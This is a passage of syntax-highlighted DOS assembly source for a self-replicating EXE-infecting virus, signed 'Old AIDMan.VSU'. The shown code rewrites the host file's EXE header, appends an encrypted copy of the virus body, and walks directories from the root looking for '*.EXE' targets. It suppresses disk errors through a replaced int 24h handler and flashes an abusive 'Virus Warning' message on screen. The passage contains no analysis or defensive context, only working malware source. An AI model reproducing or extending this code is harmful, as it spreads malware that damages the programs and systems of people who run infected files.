           </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc1">;---------------------------------------</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">HiSize</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">    </span><span class="sc1">; DX = shl (shr 9)</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LoSize</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; AX = shl (shr 9)</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">HiFSize</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">   </span><span class="sc1">; DX = old fsize + body</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LoFSize</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">   </span><span class="sc1">; AX = old fsize + body</span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LoSize</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">
           </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">HiSize</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PartPag</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; PartPag = newfsize mod 512</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                   </span><span class="sc1">; seek the pointer to the BEGIN</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Signature</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                    </span><span class="sc1">; write header of EXE</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                   </span><span class="sc1">; seek the pointer to the end</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">encrypt</span><span class="sc0">                       </span><span class="sc1">; encrypt</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">body</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; length of virus in cx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">body</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">encrypt</span><span class="sc0">                       </span><span class="sc1">; decrypt</span><span class="sc0">
           </span><span class="sc6">ret</span><span class="sc0">
           </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">vir_data</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">rootdir</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc13">"\",0
</span><span class="sc0">          </span><span class="sc5">wildcards</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"*"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc5">filespec</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"*.EXE"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc5">dirdata</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">43</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
          </span><span class="sc5">filedata</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">43</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
          </span><span class="sc5">currentdir</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">64</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
          </span><span class="sc5">idbuffer</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
          </span><span class="sc5">tempseg</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
          </span><span class="sc5">tempofs</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
          </span><span class="sc5">old24es</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
          </span><span class="sc5">old24bx</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
          </span><span class="sc5">diskdtaseg</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
          </span><span class="sc5">diskdtaofs</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
          </span><span class="sc5">handle</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
          </span><span class="sc5">orig_time</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
          </span><span class="sc5">orig_date</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
          </span><span class="sc5">orig_attr</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
          </span><span class="sc5">FileCS</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
          </span><span class="sc5">FileIP</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
          </span><span class="sc5">drivecode</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
          </span><span class="sc5">message</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' ษออออ  Virus Warning : ออออป '</span><span class="sc0">
                     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' บ BADMAN gone! So some new บ '</span><span class="sc0">
                     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' บ STUPID ASHOLES come here บ '</span><span class="sc0">
                     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' บ and I`LL HATE them too.  บ '</span><span class="sc0">
                     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' ศออออออออออออออออออออออออออผ '</span><span class="sc0">
          </span><span class="sc5">tg</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc5">Copyright</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Old AIDMan.VSU'</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">showm</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                             </span><span class="sc1">; show message</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">78</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">1488</span><span class="sc0">
</span><span class="sc5">@5</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">30</span><span class="sc0">
</span><span class="sc5">@4</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">message</span><span class="sc4">]+</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@4</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">88Ch</span><span class="sc0">                            </span><span class="sc1">; place on the screen</span><span class="sc0">
   </span><span class="sc6">jl</span><span class="sc0"> </span><span class="sc5">@5</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">250</span><span class="sc0">
</span><span class="sc5">@7</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">3C8h</span><span class="sc0">
   </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">3C9h</span><span class="sc0">
   </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
   </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                             </span><span class="sc1">; R=loCX G=0 B=0</span><span class="sc0">
   </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0fffeh</span><span class="sc0">
</span><span class="sc5">@8</span><span class="sc4">:</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@8</span><span class="sc0">                                </span><span class="sc1">; wait</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0fffeh</span><span class="sc0">
</span><span class="sc5">@9</span><span class="sc4">:</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@9</span><span class="sc0">                                </span><span class="sc1">; wait</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@7</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">; set old blue</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">3C8h</span><span class="sc0">
   </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">3C9h</span><span class="sc0">
   </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                              </span><span class="sc1">; R</span><span class="sc0">
   </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                              </span><span class="sc1">; G</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">35</span><span class="sc0">                              </span><span class="sc1">; B</span><span class="sc0">
   </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
   </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">int24h</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">virus</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">84h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">addr21</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">               </span><span class="sc1">; Offset Addr21h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">86h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">addr21</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">             </span><span class="sc1">; Segment Addr21h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OldCS</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileCS</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OldIP</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileIP</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                               </span><span class="sc1">; Get current time</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">enc_val</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">; dl = 0..99 , dh = 0..29 -?</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">19h</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                               </span><span class="sc1">; get current DRIVE</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">47h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">currentdir</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                               </span><span class="sc1">; get current DIRECTORY</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524h</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                               </span><span class="sc1">; get int24h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">old24es</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">old24bx</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int24h</span><span class="sc0">                      </span><span class="sc1">; hold ES:BX</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                               </span><span class="sc1">; set int24h</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tg</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@dirloop3</span><span class="sc0">
</span><span class="sc5">@back</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tg</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dirdata</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                               </span><span class="sc1">; set DTA</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rootdir</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                               </span><span class="sc1">; change DIRECTORY to ROOT</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">wildcards</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                               </span><span class="sc1">; find first DIRECTORY in ROOT</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@dirloop2</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@bus</span><span class="sc0">

</span><span class="sc5">@dirloop</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                               </span><span class="sc1">; find next DIRECTORY</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@bus</span><span class="sc0">

</span><span class="sc5">@dirloop2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dirdata</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                               </span><span class="sc1">; change DIRECTORY to ROOT</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">                                </span><span class="sc1">; get disk DTA</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">diskdtaseg</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
